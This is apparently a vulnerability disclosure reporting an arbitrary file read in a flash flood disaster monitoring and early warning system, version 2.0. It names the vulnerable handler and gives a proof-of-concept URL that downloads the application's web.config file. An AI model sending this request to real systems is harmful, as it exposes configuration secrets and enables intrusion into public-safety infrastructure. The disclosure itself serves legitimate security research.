  Flash flood disaster monitoring and early warning system 2.0 has arbitrary file reading vulnerability

  official website:http://www.cdwanjiang.com/

  Vulnerability location:\Service\FileHandler.ashx

  ![WPS图片(1)](https://github.com/nagenanhai/cve/assets/42707759/754b2a69-5c01-4de5-beed-d0e2d3bb68c3)

Tracking class:

\bin\MFCW.Web.dll
// MFCW.Web.Service.FileHandler

![WPS图片(2)](https://github.com/nagenanhai/cve/assets/42707759/0f75aabd-ed27-4183-b236-17565c62f56e)

POC
```
http://xx.xx.xx.xx/Service/FileHandler.ashx?Action=Download&FileDirectory=E:/SCWJ/Official/Web/MFCW/&FileName=web.config&FileSourceName=web
```
![WPS图片(3)](https://github.com/nagenanhai/cve/assets/42707759/1a8360a8-69c4-4555-81eb-30e6d6c21f56)
